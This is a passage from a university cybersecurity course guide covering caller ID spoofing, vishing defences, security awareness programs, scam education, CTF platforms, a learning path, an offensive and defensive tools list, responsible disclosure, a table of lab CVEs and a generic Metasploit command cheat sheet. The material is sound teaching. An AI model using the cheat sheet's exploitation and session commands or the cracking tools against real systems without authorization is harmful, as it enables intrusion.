Result: Any number appears as CallerID

LEGAL FRAMEWORK:
- STIR/SHAKEN (US): Cryptographic attestation of caller identity
  Implemented since 2021, helps but not universal
- FCC regulations: Illegal to spoof with intent to defraud

TESTING CALLER ID SECURITY:
# Your own VoIP lab:
sudo apt install asterisk
# Configure trunk, test calls between your own extensions
# Observe SIP headers with Wireshark:
wireshark → filter: sip
```

### 18.2 Defending Against Vishing Attacks

```
ORGANIZATIONAL DEFENSES:

Technical:
□ DMARC/SPF/DKIM for email (prevents email spoofing)
□ Call authentication (STIR/SHAKEN aware carrier)
□ Call recording and monitoring (with consent)
□ Callback verification procedures for sensitive requests
□ Wire transfer verification via out-of-band call to known number

Procedural:
□ Never act on urgent financial requests without verification
□ Callback policy: hang up, call official number
□ Dual authorization for wire transfers
□ Code word system for internal verification

Training Indicators (train staff to recognize):
□ Pressure/urgency to act immediately
□ Request to keep call secret
□ Request for remote access (TeamViewer, AnyDesk)
□ Payment via gift cards
□ Request for OTP/2FA codes
□ CallerID showing Microsoft/Apple/Government
```

---

## 19. Security Awareness Program Design

### 19.1 Building an Awareness Training Program

```
SECURITY AWARENESS FRAMEWORK:

1. PHISHING SIMULATION (like GoPhish):
   - Monthly simulated phishing campaigns
   - Track click rates, credential submission rates
   - Immediate training for those who clicked
   - Track improvement over time

2. TRAINING MODULES:
   - Password security
   - Recognizing phishing
   - Social engineering
   - Data handling
   - Physical security
   - Mobile device security
   - Remote work security

3. METRICS:
   - Phishing click rate (goal: < 5%)
   - Training completion rate (goal: 100%)
   - Time to report suspicious email
   - Number of security incidents

4. CONTENT:
   - Use real-world examples from the news
   - Make it relevant to their actual job
   - Short modules (< 15 minutes)
   - Gamification and rewards
   - Regular reinforcement (not just annual)
```

### 19.2 Scam Awareness — Key Messages for Public Education

```
COMMON SCAMS TO EDUCATE ABOUT:

1. TECH SUPPORT SCAMS:
   Red flags: Unsolicited call about "your computer has a virus"
   Defense: Microsoft/Apple/Google never cold-call you
   Action: Hang up immediately

2. INVESTMENT SCAMS:
   Red flags: Guaranteed returns, "can't lose" opportunity, urgency
   Defense: Verify with financial regulator (SEC, FCA, etc.)
   Action: Never invest based on unsolicited contact

3. ROMANCE SCAMS:
   Red flags: Online only, never meets in person, asks for money
   Defense: Reverse image search profile photo
   Action: Report to FBI IC3 (if US), local police

4. PHISHING:
   Red flags: Urgency, generic greeting, check URL carefully
   Defense: Go directly to website (don't click links)
   Action: Report to reportphishing@apwg.org

5. FAKE EMPLOYMENT:
   Red flags: Unsolicited job offer, asked to forward payments
   Defense: Verify company on official website, LinkedIn
   Action: Legitimate employers don't ask you to receive/send money

RESOURCES FOR PUBLIC EDUCATION:
- stopfraud.gov (US)
- actionfraud.police.uk (UK)
- scamwatch.gov.au (Australia)
- ic3.gov (FBI Internet Crime Complaint Center)
- consumer.ftc.gov/features/scam-alerts
```

---

## 20. CTF & Further Learning Resources

### 20.1 Capture The Flag Platforms

```
BEGINNER FRIENDLY:
- TryHackMe (tryhackme.com) — Guided learning paths
- PicoCTF (picoctf.org) — Carnegie Mellon, great for basics
- OverTheWire (overthewire.org) — Linux/web challenges

INTERMEDIATE:
- HackTheBox (hackthebox.com) — Real-world machines
- VulnHub (vulnhub.com) — Download and run locally
- CTFtime (ctftime.org) — Calendar of all CTF events

ADVANCED:
- pwn.college — Binary exploitation focus
- Root-me (root-me.org)
- CryptoHack (cryptohack.org) — Cryptography focus
```

### 20.2 Recommended Learning Path

```
MONTH 1-2: Foundations
□ Linux command line mastery (OverTheWire Bandit)
□ Networking basics (TCP/IP, DNS, HTTP)
□ Python scripting basics
□ CompTIA Security+ concepts

MONTH 3-4: Web Security
□ OWASP Top 10 on DVWA
□ Burp Suite fundamentals
□ Web app CTFs on TryHackMe
□ Bug bounty basics (HackerOne, Bugcrowd)

MONTH 5-6: Network Security
□ Wireshark traffic analysis
□ Nmap advanced usage
□ Metasploitable2 full lab
□ Network CTF challenges

MONTH 7-8: Binary/Exploitation
□ x86/x64 assembly basics
□ GDB debugging
□ Buffer overflow fundamentals
□ pwn.college

MONTH 9-12: Specialization
□ Choose: Web / Network / Malware / Cloud / Mobile
□ Bug bounty hunting
□ CTF competitions
□ Build home lab (more complex networks)

CERTIFICATIONS PATH:
CompTIA Security+ → CEH or eJPT → OSCP → OSCE
or
CompTIA Security+ → CompTIA PenTest+ → GPEN → GXPN
```

### 20.3 Tools Reference

```
INFORMATION GATHERING:
nmap         - Port scanner and service detection
theHarvester - Email/subdomain gathering
maltego      - OSINT graphing
shodan       - Internet-connected device search

WEB APPLICATION:
burpsuite    - Intercept proxy
sqlmap       - SQL injection automation
nikto        - Web server scanner
gobuster     - Directory/file brute force
wpscan       - WordPress scanner

EXPLOITATION:
metasploit   - Exploitation framework
searchsploit - Local ExploitDB search

PASSWORD ATTACKS:
hashcat      - GPU password cracking
john         - CPU password cracking
hydra        - Network login brute force

NETWORK ANALYSIS:
wireshark    - Packet analysis
tcpdump      - Command-line packet capture
netcat       - Network utility (nc)
ncat         - Netcat replacement

FORENSICS:
volatility   - Memory forensics
autopsy      - Disk forensics
binwalk      - Firmware analysis
exiftool     - Metadata analysis

MALWARE ANALYSIS:
capa         - Capability identification
ghidra       - Reverse engineering (NSA, free)
radare2      - Reverse engineering
strings      - Extract strings from binary
```

### 20.4 Reporting & Legal Framework

```
RESPONSIBLE DISCLOSURE:
When you find a vulnerability in the WILD (not in your lab):

1. DO NOT exploit it beyond proving it exists
2. Document what you found with minimal evidence
3. Contact the vendor through official security contact:
   - security@company.com
   - HackerOne/Bugcrowd program
   - CERT/CC as intermediary
4. Give them 90 days to fix (industry standard)
5. If no response after 90 days → coordinate disclosure

BUG BOUNTY PROGRAMS:
- HackerOne (hackerone.com)
- Bugcrowd (bugcrowd.com)
- Intigriti (intigriti.com)
Always read scope — only test what's in scope

REPORTING CYBERCRIME (to help police):
- Gather evidence: screenshots, URLs, IPs, email headers
- File report: ic3.gov (US), actionfraud.police.uk (UK)
- Preserve originals (courts need unmodified evidence)
- Chain of custody documentation

LEGAL PROTECTIONS FOR RESEARCHERS:
- CFAA (US) — authorization is key
- Computer Misuse Act (UK)
- Always have written permission before testing
- Bug bounty programs provide safe harbor
- Never exceed authorized scope
```

---

## Appendix A: Key CVEs Referenced in Labs

| CVE            | Software           | Vulnerability          | CVSS |
| -------------- | ------------------ | ---------------------- | ---- |
| CVE-2011-2523  | vsftpd 2.3.4       | Backdoor shell         | 10.0 |
| CVE-2007-2447  | Samba 3.0.20       | Command injection      | 10.0 |
| CVE-2010-2075  | UnrealIRCd 3.2.8.1 | Backdoor               | 10.0 |
| CVE-2004-2687  | distccd            | Command execution      | 9.3  |
| CVE-2017-0144  | Windows SMB        | EternalBlue (WannaCry) | 9.3  |
| CVE-2021-44228 | Log4j              | Log4Shell RCE          | 10.0 |

## Appendix B: Cheat Sheet — Common Metasploit Commands

```bash
msfconsole                    # Start Metasploit
search <term>                 # Search for modules
use <module>                  # Select module
show options                  # Show required options
set <OPTION> <value>          # Set option
show payloads                 # List compatible payloads
set PAYLOAD <payload>         # Set payload
run / exploit                 # Execute
back                          # Go back
sessions -l                   # List active sessions
sessions -i <id>              # Interact with session
meterpreter > help            # Show meterpreter commands
meterpreter > background      # Background session
db_nmap -sV <target>          # Nmap scan into database
hosts                         # Show discovered hosts
services                      # Show discovered services
vulns                         # Show discovered vulnerabilities
```

## Appendix C: Network Reference

```
COMMON PORTS TO KNOW:
20/21  FTP           53   DNS          3306  MySQL
22     SSH           80   HTTP         3389  RDP
23     Telnet        443  HTTPS        5432  PostgreSQL
25     SMTP          445  SMB          5900  VNC
110    POP3          1433 MSSQL        6379  Redis
143    IMAP          3000 Grafana      8080  HTTP Alt
389    LDAP          3128 Proxy        8443  HTTPS Alt

PRIVATE IP RANGES:
10.0.0.0/8          (10.0.0.0 - 10.255.255.255)
172.16.0.0/12       (172.16.0.0 - 172.31.255.255)
192.168.0.0/16      (192.168.0.0 - 192.168.255.255)
127.0.0.0/8         Loopback
```

---

_Document compiled for university cybersecurity education. All techniques should only be practiced in authorized environments — your own systems, purpose-built vulnerable VMs (Metasploitable2, DVWA), and platforms with explicit permission (HackTheBox, TryHackMe). Report real-world vulnerabilities through responsible disclosure channels._
